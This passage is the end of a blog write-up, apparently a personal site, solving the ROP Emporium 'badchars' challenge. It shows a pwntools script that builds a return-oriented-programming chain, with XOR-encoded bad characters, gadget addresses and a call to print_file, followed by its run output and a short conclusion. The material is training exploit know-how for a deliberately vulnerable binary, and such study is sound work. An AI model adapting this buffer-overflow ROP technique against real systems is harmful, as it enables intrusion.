</span></span><span style=display:flex><span>            <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#ef8383>bytes</span>([<span style=color:#c1abea>r</span>])<span style=color:#c7bf54>.</span><span style=color:#c1abea>ljust</span>(<span style=color:#d19a66>8</span>, <span style=color:#98c379>b</span><span style=color:#98c379>&#39;</span><span style=color:#d26464;font-weight:700>\x00</span><span style=color:#98c379>&#39;</span>)     <span style=color:#8a93a5;font-style:italic># r14</span>
</span></span><span style=display:flex><span>            <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#c1abea>target</span> <span style=color:#c7bf54>+</span> <span style=color:#c1abea>i</span> <span style=color:#c7bf54>*</span> <span style=color:#c1abea>CHUNKSIZE</span> <span style=color:#c7bf54>+</span> <span style=color:#c1abea>j</span>)  <span style=color:#8a93a5;font-style:italic># r15</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x400628</span>)                    <span style=color:#8a93a5;font-style:italic># xor gadget</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#c1abea>payload</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;A&#39;</span> <span style=color:#c7bf54>*</span> <span style=color:#d19a66>0x28</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>write_str</span>(<span style=color:#c1abea>elf</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>symbols</span>[<span style=color:#98c379>&#39;__data_start&#39;</span>] <span style=color:#c7bf54>+</span> <span style=color:#d19a66>1</span>, <span style=color:#98c379>&#39;flag.txt&#39;</span>, [<span style=color:#98c379>&#39;.&#39;</span>, <span style=color:#98c379>&#39;x&#39;</span>, <span style=color:#98c379>&#39;g&#39;</span>, <span style=color:#98c379>&#39;a&#39;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x4006a3</span>) <span style=color:#8a93a5;font-style:italic># pop rdi ; ret</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#c1abea>elf</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>symbols</span>[<span style=color:#98c379>&#39;__data_start&#39;</span>] <span style=color:#c7bf54>+</span> <span style=color:#d19a66>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x4004ee</span>) <span style=color:#8a93a5;font-style:italic># empty ret gadget to align stack</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#c1abea>elf</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>symbols</span>[<span style=color:#98c379>&#39;print_file&#39;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>p</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>sendline</span>(<span style=color:#c1abea>payload</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>p</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>interactive</span>()
</span></span></code></pre></td></tr></table></div></div><p>And here&rsquo;s the flag:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>$ python3 solve.py
</span></span><span style=display:flex><span>[+] Starting local process &#39;./badchars&#39;: pid 3674
</span></span><span style=display:flex><span>[*] Switching to interactive mode
</span></span><span style=display:flex><span>badchars by ROP Emporium
</span></span><span style=display:flex><span>x86_64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>badchars are: &#39;x&#39;, &#39;g&#39;, &#39;a&#39;, &#39;.&#39;
</span></span><span style=display:flex><span>&gt; Thank you!
</span></span><span style=display:flex><span>ROPE{a_placeholder_32byte_flag!}
</span></span><span style=display:flex><span>[*] Got EOF while reading in interactive
</span></span></code></pre></td></tr></table></div></div><p>GGs!</p><h2 id=conclusion>Conclusion</h2><p>This was a great introductory challenge, and probably my first real pwn challenge that wasn&rsquo;t simple buffer overflow. I never really understood pwn much before, but after a while of learning assembly through reverse engineering, it seems pretty fun! I&rsquo;ll definitely be doing more of these challenges in the future.</p><p>Originally I wanted to make a writeup for the other ROPEmporium challenges before this, but I felt like this one was a good way to demonstrate of all the previous skills needed.</p></div></div></main></div><script>function handle_open(e){let t=e.target;e.target.tagName==="SUMMARY"&&(t=e.target.querySelector(".code-summary-inner")),t.classList.toggle("open"),t.classList.contains("open")?t.textContent="Click to collapse "+t.textContent.split(" ").slice(3).join(" "):t.textContent="Click to expand "+t.textContent.split(" ").slice(3).join(" ")}let code_divs=document.querySelectorAll("div.highlight"),to_remove=[];for(let e of code_divs){let t="",n=e.previousElementSibling;n.tagName=="P"&&(n=n.textContent,n.startsWith("filename")&&(t=n.split("=")[1].trim(),to_remove.push(e.previousElementSibling)));let s=e.querySelector("pre code"),o=s.textContent.split(`
`).length;if(t!==""||o>10){let n=document.createElement("details"),o=document.createElement("summary"),i=document.createElement("span");i.textContent="Click to expand",t!==""&&(i.textContent+=" "+t,n.setAttribute("id",t)),i.classList.add("code-summary-inner"),o.appendChild(i),o.addEventListener("click",handle_open),o.classList.add("code-summary"),s.classList.add("code-inner"),e.parentNode.insertBefore(n,e),n.appendChild(o),n.appendChild(e),n.classList.add("code-wrapper")}}for(let e of to_remove)e.remove();let anchors=document.querySelectorAll(".postWrapper a");for(let e of anchors)e.host!==window.location.host&&(e.setAttribute("target","_blank"),e.setAttribute("rel","noopener noreferrer"));let headers=document.querySelectorAll(".postWrapper div h1, .postWrapper div h2, .postWrapper div h3, .postWrapper div h4, .postWrappe div h5, .postWrapper div h6");for(let t of headers){let n=t.getAttribute("id"),e=document.createElement("a");e.setAttribute("href","#"+n),e.classList.add("header-link"),e.textContent="#",t.append(e)}</script><footer class=footer>© 2023 flocto, Built with
<a href=https://gohugo.io class=footerLink>Hugo</a> and (an edited)
<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</footer></div></body></html>